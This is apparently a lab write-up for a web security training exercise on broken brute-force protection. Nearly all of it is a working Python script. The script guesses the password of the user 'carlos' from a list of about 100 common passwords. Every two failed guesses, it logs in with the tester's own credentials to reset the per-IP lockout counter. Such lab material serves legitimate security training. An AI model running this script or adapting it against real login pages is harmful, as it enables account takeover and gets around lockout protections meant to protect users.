# Broken brute-force protection, IP block
> This lab is vulnerable due to a logic flaw in its password brute-force protection. To solve the lab, brute-force the victim's password, then log in and access their account page.
- Your credentials: `wiener:peter`
- Victim's username: `carlos`

```python
import requests
import sys

BASE_URL = "https://0af700ea04efac6e809644e100c50055.web-security-academy.net/"

PASSWORDS = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345", 
    "1234", "111111", "1234567", "dragon", "123123", "baseball", 
    "abc123", "football", "monkey", "letmein", "shadow", "master", 
    "666666", "qwertyuiop", "123321", "mustang", "1234567890", "michael", 
    "654321", "superman", "1qaz2wsx", "7777777", "121212", "000000", 
    "qazwsx", "123qwe", "killer", "trustno1", "jordan", "jennifer", 
    "zxcvbnm", "asdfgh", "hunter", "buster", "soccer", "harley", 
    "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000", 
    "charlie", "robert", "thomas", "hockey", "ranger", "daniel", 
    "starwars", "klaster", "112233", "george", "computer", "michelle", 
    "jessica", "pepper", "1111", "zxcvbn", "555555", "11111111", 
    "131313", "freedom", "777777", "pass", "maggie", "159753", 
    "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", 
    "summer", "love", "ashley", "nicole", "chelsea", "biteme", 
    "matthew", "access", "yankees", "987654321", "dallas", "austin", 
    "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor", 
    "monitoring", "montana", "moon", "moscow"
]

def reset_ip(url):
    """Authenticates with known credentials to reset the backend IP block counter."""
    login_endpoint = f"{url}login"
    payload = {
        "username": "wiener",
        "password": "peter"
    }
    
    # Using requests.post directly prevents session cookie contamination
    response = requests.post(login_endpoint, data=payload)
    if "Log out" in response.text:
        # Clearing line for clean terminal output
        sys.stdout.write("\r" + " " * 50 + "\r")
        print("[+] IP BLOCK RESET SUCCESSFUL")

def check_password(url, password):
    """Attempts to authenticate as the target user."""
    login_endpoint = f"{url}login"
    payload = {
        "username": "carlos",
        "password": password
    }
    
    response = requests.post(login_endpoint, data=payload)
    if "Log out" in response.text:
        sys.stdout.write("\r" + " " * 50 + "\r")
        print(f"[+] BRUTE-FORCE SUCCESSFUL | Password found: {password}")
        return True
        
    return False

def execute_brute_force(url):
    print("[*] Initiating brute-force attack...")
    failed_attempts = 0
    
    for password in PASSWORDS:
        sys.stdout.write(f"\r[*] Checking: {password}{' ' * 10}")
        sys.stdout.flush()
        
        # Intercept the failure streak before hitting the 3-attempt block threshold
        if failed_attempts == 2:
            reset_ip(url)
            failed_attempts = 0
            
        if check_password(url, password):
            return
            
        failed_attempts += 1
        
    print("\n[-] Attack completed. No valid password found.")

if __name__ == "__main__":
    execute_brute_force(BASE_URL)
```